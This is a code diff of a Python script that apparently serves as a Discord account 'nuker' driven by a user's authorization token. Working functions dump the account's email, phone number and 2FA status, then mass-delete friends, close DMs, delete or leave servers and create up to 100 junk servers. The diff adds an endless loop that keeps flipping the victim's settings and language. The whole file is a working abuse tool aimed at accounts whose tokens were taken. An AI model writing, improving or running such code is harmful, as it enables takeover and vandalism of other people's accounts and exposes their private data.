@@ -1,11 +1,14 @@
 import requests
 import os
 import json
+from requests import status_codes
 from requests.api import head
 from selenium import webdriver
 import discord
 import sys
+import time
 import inspect
+import random
 currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
 parentdir = os.path.dirname(currentdir)
 sys.path.insert(0, parentdir) 
@@ -15,6 +18,8 @@ import platform
 if platform.system() == 'Windows':
 	asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
 
+
+lang_codes = ["en-US", "en-GB", "zh-CN", "zh-TW", "cs", "da", "nl", "fr", "de", "el", "hu", "it", "ja", "ko", "no", "pl", "pt-BR", "ru", "es-ES", "sv-SE", "th", "tr", "bg", "uk", "fi", "hr", "ro", "lt"]
 codetolang = {
     "en-US":"English (United States)",
     "en-GB":"English (Great Britain)",
@@ -72,9 +77,10 @@ def token_login(token):
 
 def token_info(token):
 		r = requests.get('https://discord.com/api/v9/users/@me', headers={"Authorization": token})
-		infos = r.json()
-		lang = infos['locale']
-		print(f"""Username: {infos['username']}
+		if r.status_code == 200:
+			infos = r.json()
+			lang = infos['locale']
+			print(f"""Username: {infos['username']}
 Discriminator: {infos['discriminator']}
 User ID: {infos['id']}
 Bio: {infos['bio']}
@@ -83,9 +89,11 @@ E-mail: {infos['email']}
 Verified: {infos['verified']}
 Phone number: {infos['phone']}
 2FA Enabled: {infos['mfa_enabled']}""")
+		else:
+			print(f'There is a problem with the token... "{r.json()["message"]}"')
 
 def del_block_friends(token, block='n'):
-	r2 = requests.get("https://discord.com/api/v8/users/@me/relationships", headers={"authorization": token})
+	r2 = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={"authorization": token})
 	if r2.status_code == 200:
 		count = 0
 		if block == 'n':
@@ -114,7 +122,8 @@ def close_dms(token):
 		for i in r3.sjon():
 			count += 1
 			requests.delete(f"https://discord.com/api/v9/channels/{i['id']}", headers={"authorization": token})
-		print(f'Closed {count} DMs')
+		sys.stdout.write(f'\rClosed {count} DMs')
+		sys.stdout.flush()
 	else:
 		print(f'There is a problem with the token... "{r3.json()["message"]}"')
 
@@ -159,17 +168,29 @@ def mass_create(token, name):
 	sys.stdout.write('Creating servers...')
 	sys.stdout.flush()
 	while count < 100:
-		count += 1
+		
 		server_name = name + '# ' + str(count)
-		requests.post("https://discord.com/api/v9/guilds", headers={"authorization": token}, json={"name": server_name})
+		r = requests.post("https://discord.com/api/v9/guilds", headers={"authorization": token}, json={"name": server_name})
+		if r.status_code == 201:
+			count += 1		
+			sys.stdout.write(f'\rServers created: {count}')
+			sys.stdout.flush()
+		elif r.status_code == 400:
+			print(f'\nDone creating {count} servers')
+			break
+		else:
+			pass
 
-
-
+def mode_spam(token):
+	while True:
+		requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"theme": "dark", "developer_mode": True, "afk_timeout": 60, "locale": random.choice(lang_codes), "message_display_compact": True, "explicit_content_filter": 2, "default_guilds_restricted": True, "friend_source_flags": {"all": True, "mutual_friends": True, "mutual_guilds": True}, "inline_embed_media": True, "inline_attachment_media": True, "gif_auto_play": True, "render_embeds": True, "render_reactions": True, "animate_emoji": True, "convert_emoticons": True, "animate_stickers": 1, "enable_tts_command": True,  "native_phone_integration_enabled": True, "contact_sync_enabled": True, "allow_accessibility_detection": True, "stream_notifications_enabled": True, "status": "idle", "detect_platform_accounts": True, "disable_games_tab": True})
+		requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"theme": "light", "developer_mode": False, "afk_timeout": 60, "locale": random.choice(lang_codes), "message_display_compact": False, "explicit_content_filter": 2, "default_guilds_restricted": False, "friend_source_flags": {"all": False, "mutual_friends": False, "mutual_guilds": False}, "inline_embed_media": False, "inline_attachment_media": False, "gif_auto_play": False, "render_embeds": False, "render_reactions": False, "animate_emoji": False, "convert_emoticons": False, "animate_stickers": 1, "enable_tts_command": False,  "native_phone_integration_enabled": False, "contact_sync_enabled": False, "allow_accessibility_detection": False, "stream_notifications_enabled": False, "status": "idle", "detect_platform_accounts": False, "disable_games_tab": False})
 
 TOKEN = ''
 #token_login(TOKEN)
 #del_block_friends(TOKEN)
 #token_info(TOKEN)
 #leave_servers(TOKEN)
-delete_servers(TOKEN)
+#delete_servers(TOKEN)
 #mass_create(TOKEN, 'ooo')
+mode_spam(TOKEN)
